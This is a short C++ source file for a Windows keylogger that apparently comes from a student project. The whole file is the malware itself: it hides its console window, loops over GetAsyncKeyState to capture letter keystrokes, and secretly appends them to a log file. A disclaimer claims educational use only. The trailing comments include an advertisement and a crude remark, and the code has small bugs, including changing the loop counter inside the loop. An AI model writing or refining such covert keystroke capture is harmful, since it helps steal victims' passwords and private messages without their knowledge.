#define _WIN32_WINNT 0x0500//Indicates the lowest version of Windows that is supported. Change to value 0x0A00 for higher minimum required. 0x0500 indicates Windows 2000.
#include <Windows.h>//WinAPI Header
#include <winuser.h>//Keyboard Log Header
#include <bits/stdc++.h>//Standard C/C++ I/O Header
#include <fstream>//For log file.
#include "Keylogging.h"

using namespace std;

//"This is my happy song - I like to sing it all day long. I'll teach you the words, then you can sing along."
int main(){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';
	while (true){
		fstream LogFile;//call function LogFile from fstream lib.
		LogFile.open("log.txt", fstream::app);
		for (int KEY = 8; KEY <= 190; KEY++){
			if (GetAsyncKeyState(KEY) == -32767) {//if key is pressed
				if (KEY >= 65 && KEY <= 90) { // A-Z
    				if (!(CheckShift() ^ CheckCapsLock())) { // Check if the letter should be lower case, XOR 
       					KEY += 32;  //Transform between Lowercase and Uppercase
					}
					//if (SpecialKeys(KEY) == false) {//func SpecialKeys(KEY) == false (normal key pressed)
					if (LogFile.is_open()) {
						LogFile << KEY << ' ' ;//log the key to log file.		
					}
					//}
				}
			}
		}
		LogFile.close();//close log file
	}
	return 0;
}
//Te is here, buy M4A4 Cyber Security
//Dit me Dung
//Disclaimer: This project is for research/educational purpose only. We have no responsibilities if this project is used for any unethical or illegal actions by anyone apart from us.
// Generated and researched at School of Electronics and Telecommunication, Hanoi University of Science and Technology - 2023 by Nguyen Minh Tuan 20213737 & Mac Quang Huy 20213709.